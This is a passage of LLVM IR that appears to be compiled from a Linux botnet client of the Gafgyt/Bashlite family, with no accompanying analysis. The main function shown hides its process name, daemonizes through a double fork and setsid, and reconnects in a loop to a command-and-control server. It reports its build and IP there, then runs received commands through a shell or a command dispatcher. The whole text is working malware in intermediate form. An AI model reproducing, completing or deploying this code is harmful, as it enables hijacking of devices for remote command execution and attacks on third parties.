; <label>:36:                                     ; preds = %29, %19
  %37 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %37, i32* @mainCommSock, align 4
  %38 = load i32, i32* @mainCommSock, align 4
  %39 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %40 = load i32, i32* %3, align 4
  %41 = call i32 @connectTimeout(i32 %38, i8* %39, i32 %40, i32 30)
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %44, label %43

; <label>:43:                                     ; preds = %36
  store i32 1, i32* %1, align 4
  br label %45

; <label>:44:                                     ; preds = %36
  store i32 0, i32* %1, align 4
  br label %45

; <label>:45:                                     ; preds = %44, %43
  %46 = load i32, i32* %1, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %101

; <label>:16:                                     ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.112, i32 0, i32 0)) #2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #13
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %16
  store i32 0, i32* %1, align 4
  br label %101

; <label>:30:                                     ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #2
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %30
  store i32 0, i32* %1, align 4
  br label %101

; <label>:37:                                     ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.113, i32 0, i32 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

; <label>:47:                                     ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.114, i32 0, i32 0)) #10
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

; <label>:51:                                     ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %52, i8** %9, align 8
  br label %53

; <label>:53:                                     ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

; <label>:63:                                     ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 4096, i32 16, i1 false)
  br label %42

; <label>:65:                                     ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %98

; <label>:71:                                     ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon.6* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i32 0, i32 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %76 = call i8* @strcpy(i8* %74, i8* %75) #2
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 %77, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  br label %79

; <label>:79:                                     ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %97

; <label>:82:                                     ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.7* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i32 0, i32 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

; <label>:94:                                     ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %10, align 4
  br label %79

; <label>:97:                                     ; preds = %79
  br label %98

; <label>:98:                                     ; preds = %97, %65
  %99 = load i32, i32* %2, align 4
  %100 = call i32 @close(i32 %99)
  br label %101

; <label>:101:                                    ; preds = %98, %36, %29, %15
  %102 = load i32, i32* %1, align 4
  ret i32 %102
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.115, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [1024 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca [10 x i8*], align 16
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.116, i32 0, i32 0), i8** %6, align 8
  %25 = call i8* @getBuild()
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.117, i32 0, i32 0), i8* %25)
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 0
  %32 = load i8*, i8** %31, align 8
  %33 = call i64 @strlen(i8* %32) #10
  %34 = call i8* @strncpy(i8* %29, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.116, i32 0, i32 0), i64 %33) #2
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.116, i32 0, i32 0), i8** %36, align 8
  %37 = load i8*, i8** %6, align 8
  %38 = ptrtoint i8* %37 to i64
  %39 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %38, i32 0, i32 0, i32 0)
  %40 = call i64 @time(i64* null) #2
  %41 = call i32 @getpid() #2
  %42 = sext i32 %41 to i64
  %43 = xor i64 %40, %42
  %44 = trunc i64 %43 to i32
  call void @srand(i32 %44) #2
  %45 = call i64 @time(i64* null) #2
  %46 = call i32 @getpid() #2
  %47 = sext i32 %46 to i64
  %48 = xor i64 %45, %47
  %49 = trunc i64 %48 to i32
  call void @init_rand(i32 %49)
  %50 = call i32 @getOurIP()
  %51 = call i32 @fork() #2
  store i32 %51, i32* %7, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %56

; <label>:53:                                     ; preds = %2
  %54 = load i32, i32* %7, align 4
  %55 = call i32 @waitpid(i32 %54, i32* %9, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:56:                                     ; preds = %2
  %57 = load i32, i32* %7, align 4
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %71, label %59

; <label>:59:                                     ; preds = %56
  %60 = call i32 @fork() #2
  store i32 %60, i32* %8, align 4
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %62, label %63

; <label>:62:                                     ; preds = %59
  call void @exit(i32 0) #14
  unreachable

; <label>:63:                                     ; preds = %59
  %64 = load i32, i32* %8, align 4
  %65 = icmp ne i32 %64, 0
  br i1 %65, label %67, label %66

; <label>:66:                                     ; preds = %63
  br label %69

; <label>:67:                                     ; preds = %63
  %68 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.118, i32 0, i32 0))
  br label %69

; <label>:69:                                     ; preds = %67, %66
  br label %70

; <label>:70:                                     ; preds = %69
  br label %73

; <label>:71:                                     ; preds = %56
  %72 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.118, i32 0, i32 0))
  br label %73

; <label>:73:                                     ; preds = %71, %70
  br label %74

; <label>:74:                                     ; preds = %73
  %75 = call i32 @setsid() #2
  %76 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.119, i32 0, i32 0)) #2
  %77 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %78

; <label>:78:                                     ; preds = %371, %81, %74
  %79 = call i32 @initConnection()
  %80 = icmp ne i32 %79, 0
  br i1 %80, label %81, label %83

; <label>:81:                                     ; preds = %78
  %82 = call i32 @sleep(i32 5)
  br label %78

; <label>:83:                                     ; preds = %78
  %84 = load i32, i32* @mainCommSock, align 4
  %85 = call i8* @getBuild()
  %86 = call i32 (i32, i8*, ...) @sockprintf(i32 %84, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.120, i32 0, i32 0), i8* %85)
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %87

; <label>:87:                                     ; preds = %370, %292, %214, %176, %83
  %88 = load i32, i32* @mainCommSock, align 4
  %89 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %90 = call i32 @recvLine(i32 %88, i8* %89, i32 4096)
  store i32 %90, i32* %11, align 4
  %91 = icmp ne i32 %90, -1
  br i1 %91, label %92, label %371

; <label>:92:                                     ; preds = %87
  store i32 0, i32* %12, align 4
  br label %93

; <label>:93:                                     ; preds = %164, %92
  %94 = load i32, i32* %12, align 4
  %95 = sext i32 %94 to i64
  %96 = load i64, i64* @numpids, align 8
  %97 = icmp ult i64 %95, %96
  br i1 %97, label %98, label %167

; <label>:98:                                     ; preds = %93
  %99 = load i32*, i32** @pids, align 8
  %100 = load i32, i32* %12, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i32, i32* %99, i64 %101
  %103 = load i32, i32* %102, align 4
  %104 = call i32 @waitpid(i32 %103, i32* null, i32 1)
  %105 = icmp sgt i32 %104, 0
  br i1 %105, label %106, label %163

; <label>:106:                                    ; preds = %98
  %107 = load i32, i32* %12, align 4
  %108 = add nsw i32 %107, 1
  store i32 %108, i32* %14, align 4
  br label %109

; <label>:109:                                    ; preds = %125, %106
  %110 = load i32, i32* %14, align 4
  %111 = zext i32 %110 to i64
  %112 = load i64, i64* @numpids, align 8
  %113 = icmp ult i64 %111, %112
  br i1 %113, label %114, label %128

; <label>:114:                                    ; preds = %109
  %115 = load i32*, i32** @pids, align 8
  %116 = load i32, i32* %14, align 4
  %117 = zext i32 %116 to i64
  %118 = getelementptr inbounds i32, i32* %115, i64 %117
  %119 = load i32, i32* %118, align 4
  %120 = load i32*, i32** @pids, align 8
  %121 = load i32, i32* %14, align 4
  %122 = sub i32 %121, 1
  %123 = zext i32 %122 to i64
  %124 = getelementptr inbounds i32, i32* %120, i64 %123
  store i32 %119, i32* %124, align 4
  br label %125

; <label>:125:                                    ; preds = %114
  %126 = load i32, i32* %14, align 4
  %127 = add i32 %126, 1
  store i32 %127, i32* %14, align 4
  br label %109

; <label>:128:                                    ; preds = %109
  %129 = load i32*, i32** @pids, align 8
  %130 = load i32, i32* %14, align 4
  %131 = sub i32 %130, 1
  %132 = zext i32 %131 to i64
  %133 = getelementptr inbounds i32, i32* %129, i64 %132
  store i32 0, i32* %133, align 4
  %134 = load i64, i64* @numpids, align 8
  %135 = add i64 %134, -1
  store i64 %135, i64* @numpids, align 8
  %136 = load i64, i64* @numpids, align 8
  %137 = add i64 %136, 1
  %138 = mul i64 %137, 4
  %139 = call noalias i8* @malloc(i64 %138) #2
  %140 = bitcast i8* %139 to i32*
  store i32* %140, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %141

; <label>:141:                                    ; preds = %156, %128
  %142 = load i32, i32* %14, align 4
  %143 = zext i32 %142 to i64
  %144 = load i64, i64* @numpids, align 8
  %145 = icmp ult i64 %143, %144
  br i1 %145, label %146, label %159

; <label>:146:                                    ; preds = %141
  %147 = load i32*, i32** @pids, align 8
  %148 = load i32, i32* %14, align 4
  %149 = zext i32 %148 to i64
  %150 = getelementptr inbounds i32, i32* %147, i64 %149
  %151 = load i32, i32* %150, align 4
  %152 = load i32*, i32** %13, align 8
  %153 = load i32, i32* %14, align 4
  %154 = zext i32 %153 to i64
  %155 = getelementptr inbounds i32, i32* %152, i64 %154
  store i32 %151, i32* %155, align 4
  br label %156

; <label>:156:                                    ; preds = %146
  %157 = load i32, i32* %14, align 4
  %158 = add i32 %157, 1
  store i32 %158, i32* %14, align 4
  br label %141

; <label>:159:                                    ; preds = %141
  %160 = load i32*, i32** @pids, align 8
  %161 = bitcast i32* %160 to i8*
  call void @free(i8* %161) #2
  %162 = load i32*, i32** %13, align 8
  store i32* %162, i32** @pids, align 8
  br label %163

; <label>:163:                                    ; preds = %159, %98
  br label %164

; <label>:164:                                    ; preds = %163
  %165 = load i32, i32* %12, align 4
  %166 = add nsw i32 %165, 1
  store i32 %166, i32* %12, align 4
  br label %93

; <label>:167:                                    ; preds = %93
  %168 = load i32, i32* %11, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %169
  store i8 0, i8* %170, align 1
  %171 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %171)
  %172 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %173 = call i8* @strstr(i8* %172, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.44, i32 0, i32 0)) #10
  %174 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %175 = icmp eq i8* %173, %174
  br i1 %175, label %176, label %179

; <label>:176:                                    ; preds = %167
  %177 = load i32, i32* @mainCommSock, align 4
  %178 = call i32 (i32, i8*, ...) @sockprintf(i32 %177, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.121, i32 0, i32 0))
  br label %87

; <label>:179:                                    ; preds = %167
  %180 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %181 = call i8* @strstr(i8* %180, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.122, i32 0, i32 0)) #10
  %182 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %183 = icmp eq i8* %181, %182
  br i1 %183, label %184, label %185

; <label>:184:                                    ; preds = %179
  call void @exit(i32 0) #14
  unreachable

; <label>:185:                                    ; preds = %179
  %186 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %186, i8** %15, align 8
  %187 = load i8*, i8** %15, align 8
  %188 = load i8, i8* %187, align 1
  %189 = zext i8 %188 to i32
  %190 = icmp eq i32 %189, 33
  br i1 %190, label %191, label %370

; <label>:191:                                    ; preds = %185
  %192 = load i8*, i8** %15, align 8
  %193 = getelementptr inbounds i8, i8* %192, i64 1
  store i8* %193, i8** %16, align 8
  br label %194

; <label>:194:                                    ; preds = %206, %191
  %195 = load i8*, i8** %16, align 8
  %196 = load i8, i8* %195, align 1
  %197 = zext i8 %196 to i32
  %198 = icmp ne i32 %197, 32
  br i1 %198, label %199, label %204

; <label>:199:                                    ; preds = %194
  %200 = load i8*, i8** %16, align 8
  %201 = load i8, i8* %200, align 1
  %202 = zext i8 %201 to i32
  %203 = icmp ne i32 %202, 0
  br label %204

; <label>:204:                                    ; preds = %199, %194
  %205 = phi i1 [ false, %194 ], [ %203, %199 ]
  br i1 %205, label %206, label %209

; <label>:206:                                    ; preds = %204
  %207 = load i8*, i8** %16, align 8
  %208 = getelementptr inbounds i8, i8* %207, i32 1
  store i8* %208, i8** %16, align 8
  br label %194

; <label>:209:                                    ; preds = %204
  %210 = load i8*, i8** %16, align 8
  %211 = load i8, i8* %210, align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 0
  br i1 %213, label %214, label %215

; <label>:214:                                    ; preds = %209
  br label %87

; <label>:215:                                    ; preds = %209
  %216 = load i8*, i8** %16, align 8
  store i8 0, i8* %216, align 1
  %217 = load i8*, i8** %15, align 8
  %218 = getelementptr inbounds i8, i8* %217, i64 1
  store i8* %218, i8** %16, align 8
  %219 = load i8*, i8** %15, align 8
  %220 = load i8*, i8** %16, align 8
  %221 = call i64 @strlen(i8* %220) #10
  %222 = getelementptr inbounds i8, i8* %219, i64 %221
  %223 = getelementptr inbounds i8, i8* %222, i64 2
  store i8* %223, i8** %15, align 8
  br label %224

; <label>:224:                                    ; preds = %244, %215
  %225 = load i8*, i8** %15, align 8
  %226 = load i8*, i8** %15, align 8
  %227 = call i64 @strlen(i8* %226) #10
  %228 = sub i64 %227, 1
  %229 = getelementptr inbounds i8, i8* %225, i64 %228
  %230 = load i8, i8* %229, align 1
  %231 = zext i8 %230 to i32
  %232 = icmp eq i32 %231, 10
  br i1 %232, label %242, label %233

; <label>:233:                                    ; preds = %224
  %234 = load i8*, i8** %15, align 8
  %235 = load i8*, i8** %15, align 8
  %236 = call i64 @strlen(i8* %235) #10
  %237 = sub i64 %236, 1
  %238 = getelementptr inbounds i8, i8* %234, i64 %237
  %239 = load i8, i8* %238, align 1
  %240 = zext i8 %239 to i32
  %241 = icmp eq i32 %240, 13
  br label %242

; <label>:242:                                    ; preds = %233, %224
  %243 = phi i1 [ true, %224 ], [ %241, %233 ]
  br i1 %243, label %244, label %250

; <label>:244:                                    ; preds = %242
  %245 = load i8*, i8** %15, align 8
  %246 = load i8*, i8** %15, align 8
  %247 = call i64 @strlen(i8* %246) #10
  %248 = sub i64 %247, 1
  %249 = getelementptr inbounds i8, i8* %245, i64 %248
  store i8 0, i8* %249, align 1
  br label %224

; <label>:250:                                    ; preds = %242
  %251 = load i8*, i8** %15, align 8
  store i8* %251, i8** %17, align 8
  br label %252

; <label>:252:                                    ; preds = %264, %250
  %253 = load i8*, i8** %15, align 8
  %254 = load i8, i8* %253, align 1
  %255 = zext i8 %254 to i32
  %256 = icmp ne i32 %255, 32
  br i1 %256, label %257, label %262

; <label>:257:                                    ; preds = %252
  %258 = load i8*, i8** %15, align 8
  %259 = load i8, i8* %258, align 1
  %260 = zext i8 %259 to i32
  %261 = icmp ne i32 %260, 0
  br label %262

; <label>:262:                                    ; preds = %257, %252
  %263 = phi i1 [ false, %252 ], [ %261, %257 ]
  br i1 %263, label %264, label %267

; <label>:264:                                    ; preds = %262
  %265 = load i8*, i8** %15, align 8
  %266 = getelementptr inbounds i8, i8* %265, i32 1
  store i8* %266, i8** %15, align 8
  br label %252

; <label>:267:                                    ; preds = %262
  %268 = load i8*, i8** %15, align 8
  store i8 0, i8* %268, align 1
  %269 = load i8*, i8** %15, align 8
  %270 = getelementptr inbounds i8, i8* %269, i32 1
  store i8* %270, i8** %15, align 8
  %271 = load i8*, i8** %17, align 8
  store i8* %271, i8** %18, align 8
  br label %272

; <label>:272:                                    ; preds = %276, %267
  %273 = load i8*, i8** %18, align 8
  %274 = load i8, i8* %273, align 1
  %275 = icmp ne i8 %274, 0
  br i1 %275, label %276, label %285

; <label>:276:                                    ; preds = %272
  %277 = load i8*, i8** %18, align 8
  %278 = load i8, i8* %277, align 1
  %279 = zext i8 %278 to i32
  %280 = call i32 @toupper(i32 %279) #10
  %281 = trunc i32 %280 to i8
  %282 = load i8*, i8** %18, align 8
  store i8 %281, i8* %282, align 1
  %283 = load i8*, i8** %18, align 8
  %284 = getelementptr inbounds i8, i8* %283, i32 1
  store i8* %284, i8** %18, align 8
  br label %272

; <label>:285:                                    ; preds = %272
  %286 = load i8*, i8** %17, align 8
  %287 = call i32 @strcmp(i8* %286, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.123, i32 0, i32 0)) #10
  %288 = icmp eq i32 %287, 0
  br i1 %288, label %289, label %312

; <label>:289:                                    ; preds = %285
  %290 = call i32 @listFork()
  %291 = icmp ne i32 %290, 0
  br i1 %291, label %292, label %293

; <label>:292:                                    ; preds = %289
  br label %87

; <label>:293:                                    ; preds = %289
  %294 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %294, i8 0, i64 1024, i32 16, i1 false)
  %295 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %296 = load i8*, i8** %15, align 8
  %297 = call i32 (i8*, i8*, ...) @szprintf(i8* %295, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.124, i32 0, i32 0), i8* %296)
  %298 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %299 = call i32 @fdpopen(i8* %298, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.125, i32 0, i32 0))
  store i32 %299, i32* %20, align 4
  br label %300

; <label>:300:                                    ; preds = %305, %293
  %301 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %302 = load i32, i32* %20, align 4
  %303 = call i8* @fdgets(i8* %301, i32 1024, i32 %302)
  %304 = icmp ne i8* %303, null
  br i1 %304, label %305, label %309

; <label>:305:                                    ; preds = %300
  %306 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @trim(i8* %306)
  %307 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %307, i8 0, i64 1024, i32 16, i1 false)
  %308 = call i32 @sleep(i32 1)
  br label %300

; <label>:309:                                    ; preds = %300
  %310 = load i32, i32* %20, align 4
  %311 = call i32 @fdpclose(i32 %310)
  call void @exit(i32 0) #14
  unreachable

; <label>:312:                                    ; preds = %285
  store i32 1, i32* %22, align 4
  %313 = load i8*, i8** %15, align 8
  %314 = call i8* @strtok(i8* %313, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.126, i32 0, i32 0)) #2
  store i8* %314, i8** %23, align 8
  %315 = load i8*, i8** %17, align 8
  %316 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 0
  store i8* %315, i8** %316, align 16
  br label %317

; <label>:317:                                    ; preds = %348, %312
  %318 = load i8*, i8** %23, align 8
  %319 = icmp ne i8* %318, null
  br i1 %319, label %320, label %350

; <label>:320:                                    ; preds = %317
  %321 = load i8*, i8** %23, align 8
  %322 = load i8, i8* %321, align 1
  %323 = zext i8 %322 to i32
  %324 = icmp ne i32 %323, 10
  br i1 %324, label %325, label %348

; <label>:325:                                    ; preds = %320
  %326 = load i8*, i8** %23, align 8
  %327 = call i64 @strlen(i8* %326) #10
  %328 = add i64 %327, 1
  %329 = call noalias i8* @malloc(i64 %328) #2
  %330 = load i32, i32* %22, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %331
  store i8* %329, i8** %332, align 8
  %333 = load i32, i32* %22, align 4
  %334 = sext i32 %333 to i64
  %335 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %334
  %336 = load i8*, i8** %335, align 8
  %337 = load i8*, i8** %23, align 8
  %338 = call i64 @strlen(i8* %337) #10
  %339 = add i64 %338, 1
  call void @llvm.memset.p0i8.i64(i8* %336, i8 0, i64 %339, i32 1, i1 false)
  %340 = load i32, i32* %22, align 4
  %341 = sext i32 %340 to i64
  %342 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %341
  %343 = load i8*, i8** %342, align 8
  %344 = load i8*, i8** %23, align 8
  %345 = call i8* @strcpy(i8* %343, i8* %344) #2
  %346 = load i32, i32* %22, align 4
  %347 = add nsw i32 %346, 1
  store i32 %347, i32* %22, align 4
  br label %348

; <label>:348:                                    ; preds = %325, %320
  %349 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.126, i32 0, i32 0)) #2
  store i8* %349, i8** %23, align 8
  br label %317

; <label>:350:                                    ; preds = %317
  %351 = load i32, i32* %22, align 4
  %352 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i32 0, i32 0
  call void @processCmd(i32 %351, i8** %352)
  %353 = load i32, i32* %22, align 4
  %354 = icmp sgt i32 %353, 1
  br i1 %354, label %355, label %369

; <label>:355:                                    ; preds = %350
  store i32 1, i32* %24, align 4
  store i32 1, i32* %24, align 4
  br label %356

; <label>:356:                                    ; preds = %365, %355
  %357 = load i32, i32* %24, align 4
  %358 = load i32, i32* %22, align 4
  %359 = icmp slt i32 %357, %358
  br i1 %359, label %360, label %368

; <label>:360:                                    ; preds = %356
  %361 = load i32, i32* %24, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %362
  %364 = load i8*, i8** %363, align 8
  call void @free(i8* %364) #2
  br label %365

; <label>:365:                                    ; preds = %360
  %366 = load i32, i32* %24, align 4
  %367 = add nsw i32 %366, 1
  store i32 %367, i32* %24, align 4
  br label %356

; <label>:368:                                    ; preds = %356
  br label %369

; <label>:369:                                    ; preds = %368, %350
  br label %370

; <label>:370:                                    ; preds = %369, %185
  br label %87

; <label>:371:                                    ; preds = %87
  br label %78
                                                  ; No predecessors!
  %373 = load i32, i32* %3, align 4
  ret i32 %373
}

declare i32 @printf(i8*, ...) #3

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

declare i32 @prctl(...) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

